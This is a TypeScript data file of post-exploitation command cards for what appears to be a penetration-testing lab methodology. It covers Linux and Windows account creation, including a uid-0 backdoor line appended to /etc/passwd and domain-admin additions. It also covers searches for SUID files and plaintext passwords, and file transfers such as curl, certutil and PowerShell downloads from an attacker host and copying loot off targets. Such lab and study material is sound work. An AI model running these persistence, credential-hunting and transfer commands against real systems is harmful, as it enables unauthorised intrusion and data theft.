import type { Technique } from "./methodology";

export const COMMANDS: Technique[] = [
  {
    id: "cmd-use",
    section: "Commands",
    title: "Shell commands, not a new method",
    look: "You already have a shell. These are the lines for users, files, and copies. They do not replace the Linux or Windows lists.",
    cmd: `# Linux cards, then Windows cards
# <user> and <pass> are placeholders. Drop the angle brackets.
# A command that needs root or Administrators will say so by failing.`,
    alive: "You can name the one job: make a user, find a file, or move a file.",
    dead: "You are running find / on a host you have not landed on yet.",
    next: "The card for that job.",
  },
  {
    id: "cmd-lin-user",
    section: "Commands",
    title: "Linux users",
    look: "You are root. useradd makes an account. usermod -aG sudo makes it an administrator on Debian and Ubuntu. A uid of 0 in /etc/passwd is root even when sudo is not installed.",
    cmd: `# a normal user
useradd -m -s /bin/bash <user>
echo '<user>:<pass>' | chpasswd
# administrator, Debian and Ubuntu
usermod -aG sudo <user>
# administrator, RHEL and CentOS
usermod -aG wheel <user>
id <user>
su - <user>
# no sudo group on the box. A second root in passwd.
openssl passwd -1 -salt x '<pass>'
echo '<user>:HASH:0:0::/root:/bin/bash' >> /etc/passwd`,
    alive: "id shows the new user, and sudo -l works for them, or the passwd line has uid 0 and su lands as root.",
    dead: "useradd: permission denied. You are not root. This card cannot create your foothold.",
    next: "Use the account to keep a login. The flag is still read from the shell you already have.",
  },
  {
    id: "cmd-lin-find",
    section: "Commands",
    title: "Linux find files and permissions",
    look: "find walks the disk. -name is the filename. -perm is the mode. -writable is writable by you. Send the errors away or the list is unreadable. head stops a search of the whole disk from filling the shell.",
    cmd: `# name. -iname ignores case.
find / -name proof.txt 2>/dev/null
find / -iname '*.conf' 2>/dev/null
# a few trees, not the whole disk
find /home /opt /var/www /root -type f -name '*.php' 2>/dev/null
# SUID
find / -perm -4000 -type f 2>/dev/null
# world-writable files, and directories you can write
find / -perm -o+w -type f 2>/dev/null | head
find / -perm -o+w -type d 2>/dev/null | head
# files you can write
find /opt /var/www /etc -writable -type f 2>/dev/null | head
# bigger than 10 megabytes
find / -type f -size +10M 2>/dev/null | head`,
    alive: "A path you can open, or a permission that matches a privilege-escalation card.",
    dead: "find: /: Permission denied on every line and you forgot 2>/dev/null. Or the only hits are /proc and /sys.",
    next: "ls -la the one path. Then the card that matches the permission.",
  },
  {
    id: "cmd-lin-grep",
    section: "Commands",
    title: "Linux find text inside files",
    look: "grep searches contents. find searches names. -R is recursive, -I skips binary files, -n prints the line number, -l prints only the filename.",
    cmd: `grep -RIn --exclude-dir=proc --exclude-dir=sys 'password' /home /opt /var/www 2>/dev/null | head
# filenames only
grep -RIl 'password' /var/www 2>/dev/null
# one file
grep -n 'password' /var/www/html/config.php
# a fixed string, so dots are not wildcards
grep -RInF 'password=' /opt 2>/dev/null | head`,
    alive: "A line with a password, a key, or a connection string, in a file you can read.",
    dead: "The word password inside a manual page or a locale file. That is not a credential.",
    next: "Try that secret on the service it belongs to, then the password card.",
  },
  {
    id: "cmd-lin-xfer",
    section: "Commands",
    title: "Linux copy files",
    look: "The target downloads from Kali when it can route to you. Kali downloads from the target when you can route to it. scp needs a login. base64 is the fallback when neither side can listen.",
    cmd: `# Kali, from the folder that holds the file
python3 -m http.server 80
# target downloads
curl -o /tmp/file http://<KALI>/file
wget -O /tmp/file http://<KALI>/file
# target serves, Kali downloads
python3 -m http.server 8080
curl -o file http://<target>:8080/file
# SSH already works
scp file <user>@<target>:/tmp/file
scp <user>@<target>:/root/proof.txt .
# pack a directory first
tar czf /tmp/loot.tgz /home/<user>
# no HTTP and no SSH. On the side that has the file:
base64 /tmp/file
# on the other side, paste, then:
base64 -d > /tmp/file
file /tmp/file
ls -l /tmp/file`,
    alive: "file and ls -l on both sides agree. The size matches. file does not say HTML.",
    dead: "curl hangs. The target cannot see your VPN address. Use the tunnel, or base64 through the shell you already have.",
    next: "chmod +x only if you are about to run it. Compare the size before you do.",
  },
  {
    id: "cmd-win-user",
    section: "Commands",
    title: "Windows users",
    look: "You are a local administrator, or you are SYSTEM. net user creates the account. net localgroup puts it in Administrators. Adding a domain admin is only after you already are one.",
    cmd: `net user <user> "<pass>" /add
net localgroup administrators <user> /add
net localgroup "Remote Desktop Users" <user> /add
net user <user>
# already domain admin, and you want a domain account
net user <user> "<pass>" /add /domain
net group "Domain Admins" <user> /add /domain`,
    alive: "The command completed successfully, and net user prints the account in Administrators.",
    dead: "Access is denied. This shell is not an administrator. A Potato or a service change comes first.",
    next: "The new account is a way back in. Read the flag from the shell you already have.",
  },
  {
    id: "cmd-win-find",
    section: "Commands",
    title: "Windows find files and permissions",
    look: "dir /s /b walks and prints full paths. where /r starts at a folder. icacls prints who can change a file. (F) and (M) are the letters that matter.",
    cmd: `dir /s /b C:\\Users\\*\\Desktop\\proof.txt C:\\Users\\*\\Desktop\\local.txt 2>nul
dir /s /b C:\\inetpub\\*.config C:\\Windows\\Panther\\unattend.xml 2>nul
where /r C:\\Users proof.txt
icacls "C:\\Program Files\\Vendor"
icacls "C:\\Program Files\\Vendor\\svc.exe"`,
    alive: "A path that exists, or icacls shows (F) or (M) for your user, Everyone, or Users.",
    dead: "File Not Found on the known paths. A search of all of C:\\ is the last resort, not the first.",
    next: "type the file, or the service card if the ACL is the bug.",
  },
  {
    id: "cmd-win-grep",
    section: "Commands",
    title: "Windows find text inside files",
    look: "findstr searches contents. /s walks subfolders. /i ignores case. /n prints the line number. Point it at extensions, not at C:\\.",
    cmd: `findstr /s /i /n "password" C:\\Users\\*.txt C:\\Users\\*.xml C:\\Users\\*.config C:\\inetpub\\*.config
findstr /s /i /n "Password" C:\\Windows\\Panther\\*.xml
# PowerShell, when the tree is one folder
powershell -c "Get-ChildItem -Path C:\\Users -Recurse -Include *.txt,*.xml,*.config -ErrorAction SilentlyContinue | Select-String -Pattern 'password' | Select-Object -First 20"`,
    alive: "A line with a password or a connection string.",
    dead: "findstr hits license text and sample xml. Read the path before you believe it.",
    next: "One login with that secret. Then the password card.",
  },
  {
    id: "cmd-win-xfer",
    section: "Commands",
    title: "Windows copy files",
    look: "The Windows host downloads from Kali with certutil or PowerShell. evil-winrm has upload and download inside that shell. smbclient writes to C$ when you are already an admin. base64 is the fallback.",
    cmd: `# Kali
python3 -m http.server 80
# target downloads
certutil -urlcache -split -f http://<KALI>/file.exe C:\\Users\\Public\\file.exe
powershell -c "Invoke-WebRequest -Uri http://<KALI>/file.exe -OutFile C:\\Users\\Public\\file.exe"
# older PowerShell
powershell -c "(New-Object Net.WebClient).DownloadFile('http://<KALI>/file.exe','C:\\Users\\Public\\file.exe')"
# inside evil-winrm, not in cmd
# upload file.exe C:\\Users\\Public\\file.exe
# download C:\\Users\\Administrator\\Desktop\\proof.txt
# Kali, you are admin
smbclient //<target>/C$ -U '<user>%<pass>' -c 'put file.exe Users\\Public\\file.exe'
smbclient //<target>/C$ -U '<user>%<pass>' -c 'get Users\\Administrator\\Desktop\\proof.txt'
# no route. On the side that has the file:
certutil -encode C:\\Users\\Public\\file.exe C:\\Users\\Public\\file.b64
# other side
certutil -decode file.b64 C:\\Users\\Public\\file.exe`,
    alive: "The size on the target matches the size on Kali, and the file does not start with <html.",
    dead: "certutil returns 0 bytes or an HTML page. The URL was a GitHub preview, or the host cannot reach Kali.",
    next: "file.exe is only useful if this host will run an exe. A 441-byte file is the download page.",
  },
];
